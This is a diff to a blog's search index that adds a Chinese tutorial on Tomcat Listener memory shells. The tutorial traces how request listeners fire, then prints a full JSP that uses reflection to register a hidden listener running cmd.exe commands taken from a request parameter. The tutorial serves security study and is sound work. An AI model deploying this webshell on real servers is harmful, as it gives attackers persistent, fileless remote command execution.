@@ -443,11 +443,12 @@ y= w_{\mathrm{area}} \cdot area + w_{\mathrm{age}} \cdot age + b + \epsilon</scr
 <p>在写这篇文章之前也不知道一些绕过方法，只是分析了一下fastjson的原理，后面看到网上的那些方法，没想到我竟然凑巧把这些绕过payload自己搞出来了，还是有点小高兴。所以说知道原理还是很重要的。<br>在下一篇就研究一下fastjson的反序列化利用，和一些绕过payload</p>
 ]]></content>
       <categories>
-        <category>java</category>
+        <category>fastjson</category>
       </categories>
       <tags>
         <tag>代码审计</tag>
         <tag>java</tag>
+        <tag>fastjson</tag>
       </tags>
   </entry>
   <entry>
@@ -484,11 +485,12 @@ y= w_{\mathrm{area}} \cdot area + w_{\mathrm{age}} \cdot age + b + \epsilon</scr
 </ul>
 ]]></content>
       <categories>
-        <category>java</category>
+        <category>内存马</category>
       </categories>
       <tags>
         <tag>代码审计</tag>
         <tag>java</tag>
+        <tag>内存马</tag>
       </tags>
   </entry>
   <entry>
@@ -507,6 +509,31 @@ y= w_{\mathrm{area}} \cdot area + w_{\mathrm{age}} \cdot age + b + \epsilon</scr
       </categories>
       <tags>
         <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Listener内存马</title>
+    <url>/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>讲解Listener内存马原理，和简单实现<br><span id="more"></span></p>
+<h2 id="Listener加载原理"><a href="#Listener加载原理" class="headerlink" title="Listener加载原理"></a>Listener加载原理</h2><p><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/1.jpg" alt><br>还是这张图，Listener是在最开始就被创建的</p>
+<p>Listener一共有8个监听器接口，但是由于内存马的特殊性，一般是在ServletRequestListener接口进行内存马注入，该接口用于监听 ServletRequest 对象的创建和销毁过程，而每次访问服务器都会触发此接口</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>前期准备可以看看Filter内存马的文章</p>
+<p>先写一个Listener的容器，实现了ServletRequestListener接口，用注解的方式进行注册<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了TestListener requestInitialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了TestListener requestDestroyed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在requestInitialized处打上断点，根据调用栈，可以知道是<code>context.fireRequestInitEvent(request.getRequest())</code>进行了初始化<br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/2.jpg" alt><br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/3.jpg" alt></p>
+<p>context是由<code>request.getContext();</code>初始化，在后续利用需要<br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/4.jpg" alt></p>
+<p>进入<code>context.fireRequestInitEvent</code>函数，可以看到是由listener进行了监听器初始化，且listener来源于<code>getApplicationEventListeners();</code><br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/5.jpg" alt><br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/6.jpg" alt></p>
+<h2 id="内存马实现"><a href="#内存马实现" class="headerlink" title="内存马实现"></a>内存马实现</h2><p>通过上面的分析，我们可以知道，只需要往applicationEventListenersList中加入我们的Listener对象就可以了<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmdl&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                    request.getResponse().getWriter().write(out);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (NoSuchFieldException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (IllegalAccessException e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">aELL</span> <span class="operator">=</span> context.getClass().getDeclaredField(<span class="string">&quot;applicationEventListenersList&quot;</span>);</span><br><span class="line">    aELL.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">List</span> <span class="variable">applicationEventListenersList</span> <span class="operator">=</span> (List)aELL.get(context);</span><br><span class="line">    <span class="type">MyListener</span> <span class="variable">listenerDemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyListener</span>();</span><br><span class="line">    applicationEventListenersList.add(listenerDemo);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><br>根据前面的分析，context是由<code>request.getContext();</code>得到的，所以写内存马的时候也可以通过同样的方式获取</p>
+<p>增加applicationEventListenersList，这里我是通过反射的方式获取到了private属性的applicationEventListenersList，然后进行了一次add<br>当然也可以通过context提供的成员方法进行修改<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">standardContext.addApplicationEventListener(listenerDemo);</span><br></pre></td></tr></table></figure></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a href="https://xz.aliyun.com/t/10358">https://xz.aliyun.com/t/10358</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>内存马</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+        <tag>java</tag>
+        <tag>内存马</tag>
       </tags>
   </entry>
 </search>
